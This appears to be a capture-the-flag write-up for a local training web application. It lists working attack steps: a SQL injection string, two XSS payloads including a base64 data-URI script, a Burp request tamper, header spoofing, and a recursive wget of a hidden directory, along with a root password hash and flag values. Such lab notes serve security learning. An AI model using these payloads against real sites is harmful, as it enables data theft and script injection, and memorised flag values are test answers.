
- http://localhost:8888/robots.txt
    - /whatever -> download a file htpasswd -> root:437394baff5aa33daa618be47b75cb49 
    - /.hidden  -> Multiple directories and subdirectories to discover

    ```bash
        > wget -e robots=off --recursive --no-parent  http://localhost:8888/.hidden/
        > grep -R "flag" -> whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README:Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466 
    ```

flag: d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466

---

- SQL Injection:
    - http://localhost:8888/?page=member
    - ' give us an Sql error meaning that there is a possible SQL injection
    - 1 OR 1=1-- - List us every users and the columns (2 columns: First name and Surname)
        - SELECT name, surname FROM users WHERE id = 1 OR 1=1-- -; become SELECT name, surname FROM users WHERE TRUE
    ```bash
        ID: 1 OR 1=1-- -; 
        First name: one
        Surname : me
        ID: 1 OR 1=1-- -; 
        First name: two
        Surname : me
        ID: 1 OR 1=1-- -; 
        First name: three
        Surname : me
        ID: 1 OR 1=1-- -; 
        First name: Flag
        Surname : GetThe
    ```
    // TODO //

--- 

- Recover Email:
    - http://localhost:8888/index.php?page=recover
    - Intercept POST request with Burp and modify e-mail with our e-mail and get the flag
    - 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0

---

- XSS:
    - http://localhost:8888/?page=feedback
    - &#60;a href=# onpointerenter=alert(1)&#62;Hover&#60;/a&#62;  (Url encoded  <> from <a href=# onpointerenter=alert(1)>Hover me</a>)
    - Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

---
- XSS 2:
    - http://localhost:8888/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
    - Flag: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

---
- HTTP Header Modification
    - Clicking on the @BornToSec link we get to this url:
    - http://localhost:8888/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
    - In the source code we see that you have to change the referer and user-agent parameter of the http request in order to get the flag.